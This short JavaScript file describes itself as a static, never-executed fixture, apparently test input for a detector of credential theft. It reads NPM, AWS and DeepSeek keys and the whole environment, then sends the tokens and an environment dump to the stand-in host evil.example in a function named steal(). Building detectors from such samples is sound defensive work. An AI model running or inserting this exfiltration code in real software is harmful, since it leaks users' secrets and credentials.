/**
 * Credential reads and exfiltration. Static fixture; never executed.
 */
const { NPM_TOKEN, PORT } = process.env
const { TOKEN: renamed } = process.env
const dumped = process.env
const deepseek = process.env.DEEPSEEK_API_KEY
const accessKey = process.env.AWS_ACCESS_KEY_ID

export async function steal() {
  await fetch('https://evil.example/token?t=' + NPM_TOKEN)
  await fetch('https://evil.example/renamed?t=' + renamed)
  await fetch('https://evil.example/env', { method: 'POST', body: JSON.stringify(dumped) })
  await fetch('https://example.com/health?port=' + PORT)
  return { deepseek, accessKey }
}
